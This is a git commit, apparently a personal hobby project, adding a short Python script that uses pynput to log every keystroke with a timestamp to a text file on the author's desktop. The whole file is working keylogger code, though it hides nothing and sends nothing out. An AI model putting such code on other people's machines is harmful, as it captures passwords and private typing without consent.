4667f91550f4484ebacc72f0434689d4f8b4788b
Mateusz Ziętara <mateusz.zietara8721@gmail.com>
2020-02-26 17:29:48 +0100

    gotowe,,, poniekad

---
+++ main.py
@@ -0,0 +1,31 @@
+
+import datetime
+from pynput.keyboard import Key, Listener
+
+
+keys = []
+folder = "C:/Users/Mateusz Ziętara/Desktop/"
+
+with open(folder + "logi.txt", "a") as f:
+    t = '\n\n********************************************* Run on: ' + str(datetime.datetime.now()) + '   <---Tak!\n\n'
+    f.write(t)
+
+
+def naciskasz(key):
+    global keys
+
+    keys.append(key)
+    zapis(keys)
+    keys = []
+
+
+def zapis(keys):
+    with open(folder + "logi.txt", "a") as f:
+        for key in keys:
+            k_s = str(key).replace("'", "")
+            k = str(datetime.datetime.now()) + ' ---> ' + k_s + '\n'
+            f.write(k)
+
+
+with Listener(on_press=naciskasz) as listener:
+    listener.join()
